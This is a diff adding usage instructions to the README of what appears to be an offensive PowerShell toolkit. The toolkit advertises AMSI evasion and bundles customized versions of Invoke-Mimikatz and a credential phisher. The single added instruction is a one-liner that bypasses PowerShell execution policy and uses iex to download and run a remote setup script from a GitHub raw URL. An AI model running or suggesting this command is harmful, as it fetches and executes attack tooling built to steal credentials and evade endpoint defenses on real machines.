@@ -24,3 +24,9 @@ obfuscation technique. In fact, only the commands necessary for AMSI evasion tec
 
 This repository contains well-known scripts such as Invoke-Mimikatz Invoke-Powershell Invoke-CrerdentialPhisher that
 they have been patched or customized for easy integration. The actions performed do not compromise the signature of the scripts.
+
+#Instructions
+
+To start the console run this line
+
+powershell -Execution bypass "iex((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Console-Setup.ps1'))"
